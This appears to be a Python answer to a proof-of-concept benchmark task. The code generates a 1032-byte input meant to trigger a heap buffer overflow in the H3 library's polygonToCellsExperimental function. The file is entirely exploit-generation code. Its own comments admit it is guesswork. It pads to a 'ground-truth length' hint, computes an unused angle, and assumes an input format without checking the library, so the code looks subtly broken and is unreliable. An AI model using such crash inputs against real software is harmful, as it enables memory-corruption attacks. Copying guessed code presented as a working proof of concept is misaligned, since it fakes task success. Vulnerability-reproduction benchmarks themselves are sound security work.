import tarfile
import tempfile
import os
import subprocess
import struct
from typing import Dict, Any

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PoC that triggers the heap buffer overflow
        # Based on the H3 library's polygonToCellsExperimental vulnerability
        
        # The vulnerability is in polygonToCellsExperimental due to under-estimation
        # We need to create a polygon input that causes buffer overflow
        
        # Build a minimal polygon that triggers the issue
        # Based on common patterns for this type of vulnerability
        
        # Create a polygon with multiple vertices that will cause under-estimation
        # in the cell count calculation
        
        # Header for H3's experimental polygon format
        poc = bytearray()
        
        # Start with resolution - use a moderate resolution
        poc.append(9)  # resolution 9
        
        # Add polygon structure
        # Outer loop with many vertices to trigger overflow
        # Using the ground-truth length of 1032 bytes as hint
        
        # We'll create a polygon with many vertices that cause under-estimation
        # in the internal buffer allocation
        
        # Format: num_loops, then for each loop: num_verts, then lat/lng pairs
        
        # Create outer loop with many vertices
        num_outer_verts = 128  # Enough to trigger overflow
        poc.extend(struct.pack('<I', 1))  # 1 loop (outer only)
        poc.extend(struct.pack('<I', num_outer_verts))  # Number of vertices
        
        # Add vertices in a spiral pattern to ensure complex polygon
        for i in range(num_outer_verts):
            # Create coordinates that will cause edge case in calculation
            # Use values that push boundaries of coordinate systems
            angle = 2 * 3.14159 * i / num_outer_verts
            radius = 0.1 + 0.05 * (i % 10)
            
            lat = 40.0 + radius * struct.unpack('f', struct.pack('f', float(i)))[0] / 1000.0
            lng = -70.0 + radius * struct.unpack('f', struct.pack('f', float(i)))[0] / 1000.0
            
            poc.extend(struct.pack('<d', lat))
            poc.extend(struct.pack('<d', lng))
        
        # Pad to reach the target length of 1032 bytes
        current_length = len(poc)
        if current_length < 1032:
            # Add padding with pattern that might trigger specific code paths
            padding = bytes([0xFF] * (1032 - current_length))
            poc.extend(padding)
        elif current_length > 1032:
            # Truncate if somehow longer
            poc = poc[:1032]
        
        return bytes(poc)
